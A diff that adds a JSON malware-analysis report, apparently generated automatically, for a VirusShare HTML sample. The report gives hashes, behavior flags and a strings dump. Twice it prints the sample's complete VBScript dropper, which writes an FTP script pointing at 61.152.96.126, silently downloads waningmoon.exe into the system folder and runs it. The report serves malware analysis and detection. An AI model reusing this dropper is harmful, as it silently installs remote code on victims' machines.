@@ -1,0 +1,60 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "open": "May open a file",
+            "shell": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "<title>-</title>\n<script language=vbscript> \nDim fso, tf, winsys, exefile\nexefile = \"waningmoon.exe\"\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet tf = fso.CreateTextFile(\"ftp.txt\",true)\nwinsys = fso.GetSpecialFolder(1)\ntf.Writeline \"open 61.152.96.126\"\ntf.Writeline \"mirmm\"\ntf.Writeline \"mirmm\"\ntf.Writeline \"lcd \" & winsys\ntf.Writeline \"get \" & exefile\ntf.Writeline \"bye\"\ntf.Close\nset wshshell=createobject (\"wscript.shell\" )\nwshshell.Run \"ftp -s:ftp.txt\", 0 ,true\nwshshell.Run winsys & \"\\\" & exefile\nfso.DeleteFile \"ftp.txt\",true\nwindow.close() \n</script> "
+    },
+    "filename": "VirusShare_e02bfb00f42ee47933039dc17864fb00",
+    "filesize": 589,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "e02bfb00f42ee47933039dc17864fb00",
+        "sha1": "354142f1d8d7bf11ab059be5441e68ffe996994a",
+        "sha256": "34bf84a83ce5d1116a35f8d2220c16b809631a9f7c0be83c95cdad30858e1333"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<title>-</title>",
+            "<script language=vbscript> ",
+            "Dim fso, tf, winsys, exefile",
+            "exefile = \"waningmoon.exe\"",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set tf = fso.CreateTextFile(\"ftp.txt\",true)",
+            "winsys = fso.GetSpecialFolder(1)",
+            "tf.Writeline \"open 61.152.96.126\"",
+            "tf.Writeline \"mirmm\"",
+            "tf.Writeline \"mirmm\"",
+            "tf.Writeline \"lcd \" & winsys",
+            "tf.Writeline \"get \" & exefile",
+            "tf.Writeline \"bye\"",
+            "tf.Close",
+            "set wshshell=createobject (\"wscript.shell\" )",
+            "wshshell.Run \"ftp -s:ftp.txt\", 0 ,true",
+            "wshshell.Run winsys & \"\\\" & exefile",
+            "fso.DeleteFile \"ftp.txt\",true",
+            "window.close() ",
+            "</script> "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "61.152.96.126"
+        ],
+        "url": []
+    },
+    "time": "0:00:00.290330",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
